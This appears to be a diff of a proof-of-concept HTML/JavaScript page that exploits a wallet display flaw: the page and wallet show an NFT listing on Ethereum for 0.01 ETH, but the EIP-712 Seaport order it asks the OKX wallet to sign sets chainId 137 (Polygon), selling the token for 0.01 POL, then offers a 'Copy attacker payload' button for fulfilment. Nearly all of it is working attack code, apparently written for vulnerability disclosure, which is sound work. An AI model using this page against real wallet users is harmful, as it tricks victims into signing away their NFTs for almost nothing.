@@ -1,40 +1,47 @@
 <!DOCTYPE html>
 <html><head><title>Polygon PoC (1hr expiry)</title></head>
 <body style="font-family:monospace;padding:20px;max-width:780px">
-<h3>List NFT #1 — wallet says Ethereum, order is on Polygon (1 hour expiry)</h3>
+<h3>List NFT #0 — wallet says Ethereum, order is on Polygon (1 hour expiry)</h3>
 <div style="border:1px solid #ccc;padding:12px;margin:8px 0;background:#f0f7ff;border-radius:6px">
   <div style="display:flex;justify-content:space-between">
-    <div><div style="font-size:13px;color:#666">Selling</div><div style="font-size:18px;font-weight:bold">1× XPOC #1</div></div>
-    <div style="text-align:right"><div style="font-size:13px;color:#666">You will receive</div><div style="font-size:22px;font-weight:bold;color:#2563eb">0.01 ETH</div><div style="font-size:13px;color:#888">$21.33</div></div>
+    <div><div style="font-size:13px;color:#666">Selling</div><div style="font-size:18px;font-weight:bold">1x testcolll213 #0</div></div>
+    <div style="text-align:right"><div style="font-size:13px;color:#666">You will receive</div><div style="font-size:22px;font-weight:bold;color:#2563eb">0.01 ETH</div></div>
   </div>
   <div style="margin-top:8px;font-size:13px;color:#555">Network: <b>Ethereum</b> • Expires: <b>1 hour</b> • Seaport 1.6<br>
-  <span style="color:#b91c1c;font-size:12px">[Display: Ethereum / 0.01 ETH ($21). Actual: Polygon / 0.01 POL ($0.004).]</span></div>
+  <span style="color:#b91c1c;font-size:12px">[Display: Ethereum / 0.01 ETH. Actual: Polygon / 0.01 POL.]</span></div>
 </div>
 <button onclick="doConnect()" style="padding:8px 16px;font-size:14px">1. Connect</button>
 <button onclick="doSwitch()" style="padding:8px 16px;font-size:14px">2. Switch to Ethereum</button>
 <button onclick="doSign()" style="padding:8px 24px;font-size:15px;background:#2563eb;color:#fff;border:none;border-radius:4px;cursor:pointer">3. Confirm Listing</button>
+<button id="copyBtn" onclick="copyPayload()" style="padding:8px 16px;font-size:13px;display:none">Copy attacker payload</button>
 <pre id="out" style="white-space:pre-wrap;background:#eee;padding:10px;margin-top:12px">waiting...</pre>
 <script>
-function log(x){ document.getElementById('out').textContent = x; }
-const NFT = '0x3DEC9CDC50CD26075932ae9383E75E11157290e0';
+// OKX Studio NFT minted by the victim; Seaport approval set by the victim's real OKX marketplace listing
+const NFT = '0x4fedad6d9789fe9dee789cdace44c38e456b6047';
+const TOKEN_ID = 2;
 const SEAPORT = '0x0000000000000068F116a894984e2DB1123eB395';
-let signer = null;
+let signer = null, payload = null;
+const out = (t) => document.getElementById('out').textContent = t;
+
 async function doConnect(){
-  try { const acc = await window.okxwallet.request({ method: 'eth_requestAccounts' });
-    signer = Array.isArray(acc) ? acc[0] : acc; log('connected: ' + signer);
-  } catch(e){ log('connect error: ' + (e.message || e)); }
+  try {
+    const a = await window.okxwallet.request({ method: 'eth_requestAccounts' });
+    signer = Array.isArray(a) ? a[0] : a;
+    out('connected: ' + signer);
+  } catch(e){ out('connect error: ' + (e.message || e)); }
 }
 async function doSwitch(){
-  try { await window.okxwallet.request({ method: 'wallet_switchEthereumChain', params:[{ chainId: '0x1' }] });
-    log('wallet on: ' + await window.okxwallet.request({ method: 'eth_chainId' }) + ' (Ethereum)');
-  } catch(e){ log('switch error: ' + (e.message || e)); }
+  try {
+    await window.okxwallet.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x1' }] });
+    out('wallet on: ' + await window.okxwallet.request({ method: 'eth_chainId' }) + ' (Ethereum)');
+  } catch(e){ out('switch error: ' + (e.message || e)); }
 }
 async function doSign(){
-  if(!signer){ log('connect first'); return; }
-  log('requesting signature ...');
-  const now = Math.floor(Date.now()/1000);
+  if (!signer) { out('connect first'); return; }
+  out('requesting signature ...');
+  const now = Math.floor(Date.now() / 1000);
   const typed = {
-    domain: { name:'Seaport', version:'1.6', chainId:137, verifyingContract: SEAPORT },
+    domain: { name: 'Seaport', version: '1.6', chainId: 137, verifyingContract: SEAPORT },
     primaryType: 'OrderComponents',
     types: {
       EIP712Domain: [{name:'name',type:'string'},{name:'version',type:'string'},{name:'chainId',type:'uint256'},{name:'verifyingContract',type:'address'}],
@@ -45,36 +52,37 @@ async function doSign(){
     message: {
       offerer: signer,
       zone: '0x0000000000000000000000000000000000000000',
-      offer: [{ itemType:2, token: NFT, identifierOrCriteria:1, startAmount:1, endAmount:1 }],
-      consideration: [{ itemType:0, token:'0x0000000000000000000000000000000000000000', identifierOrCriteria:0, startAmount:'10000000000000000', endAmount:'10000000000000000', recipient: signer }],
+      offer: [{ itemType: 2, token: NFT, identifierOrCriteria: TOKEN_ID, startAmount: 1, endAmount: 1 }],
+      consideration: [{ itemType: 0, token: '0x0000000000000000000000000000000000000000', identifierOrCriteria: 0, startAmount: '10000000000000000', endAmount: '10000000000000000', recipient: signer }],
       orderType: 0, startTime: now, endTime: now + 3600,
       zoneHash: '0x' + '00'.repeat(32),
-      salt: '0x' + (Math.floor(Math.random()*1e16)).toString(16).padStart(64,'0').slice(-64),
-      conduitKey: '0x' + '00'.repeat(32), counter: 0
+      salt: '0x' + Math.floor(Math.random() * 1e16).toString(16).padStart(64, '0').slice(-64),
+      conduitKey: '0x' + '00'.repeat(32),
+      counter: 0
     }
   };
   window.__typed = typed;
   const j = JSON.stringify(typed);
   for (const [name, fn] of [
-    ['eth_signTypedData_v4 (request)', () => window.okxwallet.request({ method:'eth_signTypedData_v4', params:[signer, j] })],
+    ['eth_signTypedData_v4 (request)', () => window.okxwallet.request({ method: 'eth_signTypedData_v4', params: [signer, j] })],
     ['eth_signTypedData_v4 (legacy)', () => window.okxwallet.signTypedData_v4(signer, j)],
   ]) {
     try {
       const sig = await Promise.race([fn(), new Promise((_, rej) => setTimeout(() => rej(new Error('timeout 45s')), 45000))]);
       if (sig) {
         window.__sig = sig;
-        window.__payload = JSON.stringify({ typed, signature: sig });
-        log('SIGNATURE_RETURNED via ' + name + '\n\n' + sig + '\n\nCopy the attacker payload with the button below, then paste it into the fulfillment page.');
-        const b = document.createElement('button');
-        b.textContent = 'Copy attacker payload (typed+signature)';
-        b.style.cssText = 'padding:8px 14px;font-size:13px;margin-top:10px';
-        b.onclick = () => { navigator.clipboard.writeText(window.__payload); b.textContent = 'Copied!'; };
-        document.getElementById('out').after(b);
+        payload = JSON.stringify({ typed, signature: sig });
+        out('SIGNATURE_RETURNED via ' + name + '\n\n' + sig + '\n\nThe wallet showed Ethereum / 0.01 ETH.\nThe order is actually on Polygon (chainId 137) for 0.01 POL.\n\nClick "Copy attacker payload".');
+        document.getElementById('copyBtn').style.display = 'inline-block';
         return;
       }
-    } catch(e){ log(name + ' error: ' + (e.message || e)); }
+    } catch(e){ out(name + ' error: ' + (e.message || e)); }
   }
-  log('ALL SIGN METHODS FAILED');
+  out('ALL SIGN METHODS FAILED');
+}
+function copyPayload(){
+  navigator.clipboard.writeText(payload);
+  document.getElementById('copyBtn').textContent = 'Copied!';
 }
 </script>
 </body></html>
